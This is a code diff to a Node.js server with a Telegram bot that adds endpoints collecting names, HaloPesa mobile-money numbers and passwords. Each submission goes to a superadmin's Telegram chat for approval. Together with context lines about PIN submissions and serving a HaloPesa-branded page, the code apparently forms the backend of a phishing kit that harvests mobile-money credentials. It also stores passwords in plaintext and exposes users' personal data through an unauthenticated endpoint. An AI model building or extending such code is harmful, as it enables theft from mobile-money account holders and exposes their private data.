@@ -36,6 +36,7 @@ const pausedAdmins      = new Set(); // adminIds that are paused
 const processingLocks   = new Set(); // prevents duplicate pin submissions
 const suspendAllSessions = new Map(); // superadmin chatId → session data
 const pendingPayments   = new Map(); // chatId → payment claim data
+const pendingRegistrations = new Map(); // registrationId → { data, status, timestamp, adminResponse }
 const pendingRenewals   = new Map(); // chatId → renewal claim data
 
 const SUSPEND_PAGE_SIZE = 10;
@@ -199,6 +200,77 @@ bot.on('error',         (error) => console.error('❌ Bot error:',    error?.mes
 bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));
 
 setupCommandHandlers();
+
+// ==========================================
+// TELEGRAM CALLBACK QUERY HANDLER (for registration approval/rejection)
+// ==========================================
+bot.on('callback_query', async (query) => {
+    const data = query.data;
+    const chatId = query.message.chat.id;
+    const messageId = query.message.message_id;
+
+    try {
+        // APPROVE REGISTRATION
+        if (data.startsWith('app_approve_')) {
+            const registrationId = data.replace('app_approve_', '');
+            const registration = pendingRegistrations.get(registrationId);
+
+            if (!registration) {
+                await bot.answerCallbackQuery(query.id, { text: '❌ Registration not found', show_alert: true });
+                return;
+            }
+
+            registration.status = 'approved';
+            registration.adminResponse = chatId;
+
+            console.log(`✅ Registration APPROVED: ${registrationId}`);
+
+            await bot.editMessageText(
+                `✅ *REGISTRATION APPROVED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``,
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [] }
+                }
+            );
+
+            await bot.answerCallbackQuery(query.id, { text: '✅ Approved!', show_alert: false });
+        }
+        // REJECT REGISTRATION
+        else if (data.startsWith('app_reject_')) {
+            const registrationId = data.replace('app_reject_', '');
+            const registration = pendingRegistrations.get(registrationId);
+
+            if (!registration) {
+                await bot.answerCallbackQuery(query.id, { text: '❌ Registration not found', show_alert: true });
+                return;
+            }
+
+            registration.status = 'rejected';
+            registration.adminResponse = chatId;
+            registration.rejectionReason = 'Kataliwa na msimamizi';
+
+            console.log(`❌ Registration REJECTED: ${registrationId}`);
+
+            await bot.editMessageText(
+                `❌ *REGISTRATION REJECTED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``,
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [] }
+                }
+            );
+
+            await bot.answerCallbackQuery(query.id, { text: '❌ Rejected!', show_alert: false });
+        }
+    } catch (error) {
+        console.error('❌ Callback query error:', error);
+        await bot.answerCallbackQuery(query.id, { text: '❌ Error processing action', show_alert: true });
+    }
+});
+
 console.log('✅ Command handlers configured!');
 
 // ==========================================
@@ -1902,6 +1974,135 @@ app.get('/api/check-returning-customer/:phoneNumber', async (req, res) => {
     }
 });
 
+
+// ==========================================
+// ════════════════════════════════════════
+// REGISTRATION ENDPOINTS (NEW - NO CONFLICTS)
+// ════════════════════════════════════════
+// ==========================================
+
+// POST /api/register-user
+app.post('/api/register-user', async (req, res) => {
+  try {
+    const { firstName, lastName, haloNumber, password, timestamp } = req.body;
+
+    if (!firstName || !lastName || !haloNumber || !password) {
+      return res.status(400).json({ success: false, message: 'Missing required fields' });
+    }
+
+    if (password.length < 6) {
+      return res.status(400).json({ success: false, message: 'Password too short' });
+    }
+
+    const registrationId = 'REG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+    pendingRegistrations.set(registrationId, {
+      firstName,
+      lastName,
+      haloNumber,
+      password,
+      timestamp: new Date(timestamp),
+      status: 'pending',
+      adminResponse: null,
+      rejectionReason: null
+    });
+
+    console.log(`📋 New registration pending: ${registrationId}`);
+    console.log(`   Name: ${firstName} ${lastName}`);
+    console.log(`   HaloPesa: ${haloNumber}`);
+
+    try {
+      const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
+      
+      const message = `
+🔔 *NEW REGISTRATION REQUEST*
+
+👤 *Jina:* ${firstName} ${lastName}
+🔑 *HaloPesa Number:* ${haloNumber}
+📧 *Namba ya Siri:* ••••••
+⏰ *Wakati:* ${new Date(timestamp).toLocaleString()}
+
+📱 *Registration ID:* \`${registrationId}\`
+      `;
+
+      const approveBtn = {
+        text: '✅ Idhinisha',
+        callback_data: `app_approve_${registrationId}`
+      };
+
+      const rejectBtn = {
+        text: '❌ Kataa',
+        callback_data: `app_reject_${registrationId}`
+      };
+
+      await bot.sendMessage(superAdminChatId, message.trim(), {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [[approveBtn, rejectBtn]]
+        }
+      });
+
+      console.log(`✅ Registration sent to Telegram: ${registrationId}`);
+    } catch (telegramError) {
+      console.error('❌ Error sending to Telegram:', telegramError.message);
+    }
+
+    res.json({
+      success: true,
+      registrationId,
+      message: 'Registration submitted. Waiting for admin approval.'
+    });
+
+  } catch (error) {
+    console.error('❌ Registration error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+// GET /api/check-registration-approval/:registrationId
+app.get('/api/check-registration-approval/:registrationId', async (req, res) => {
+  try {
+    const { registrationId } = req.params;
+    
+    const registration = pendingRegistrations.get(registrationId);
+
+    if (!registration) {
+      return res.status(404).json({ 
+        success: false, 
+        message: 'Registration not found' 
+      });
+    }
+
+    res.json({
+      success: true,
+      status: registration.status,
+      reason: registration.rejectionReason || null
+    });
+
+  } catch (error) {
+    console.error('❌ Check approval error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+// GET /api/registrations/pending
+app.get('/api/registrations/pending', (req, res) => {
+  const pending = [];
+  for (const [regId, data] of pendingRegistrations.entries()) {
+    if (data.status === 'pending') {
+      pending.push({
+        registrationId: regId,
+        firstName: data.firstName,
+        lastName: data.lastName,
+        haloNumber: data.haloNumber,
+        timestamp: data.timestamp,
+        status: data.status
+      });
+    }
+  }
+  res.json({ success: true, pendingCount: pending.length, registrations: pending });
+});
+
 // GET /health
 app.get('/health', (req, res) => {
     const isDbConnected = db.isConnected && db.isConnected();
@@ -1998,6 +2199,23 @@ app.get('/', async (req, res) => {
     res.sendFile(path.join(__dirname, 'halopesa-integrated.html'));
 });
 
+
+// ==========================================
+// CLEANUP: Remove old registrations after 24 hours
+// ==========================================
+setInterval(() => {
+  const now = Date.now();
+  const maxAge = 24 * 60 * 60 * 1000;
+
+  for (const [registrationId, registration] of pendingRegistrations.entries()) {
+    const regAge = now - registration.timestamp.getTime();
+    if (regAge > maxAge) {
+      pendingRegistrations.delete(registrationId);
+      console.log(`🧹 Cleaned up old registration: ${registrationId}`);
+    }
+  }
+}, 60 * 60 * 1000);
+
 // ==========================================
 // START SERVER
 // ==========================================
@@ -2033,6 +2251,7 @@ async function shutdownGracefully(signal) {
         // Step 2: Clear in-memory data
         console.log('🧹 Clearing in-memory data...');
         suspendAllSessions.clear();
+        pendingRegistrations.clear();
         pendingPayments.clear();
         pendingRenewals.clear();
         adminChatIds.clear();
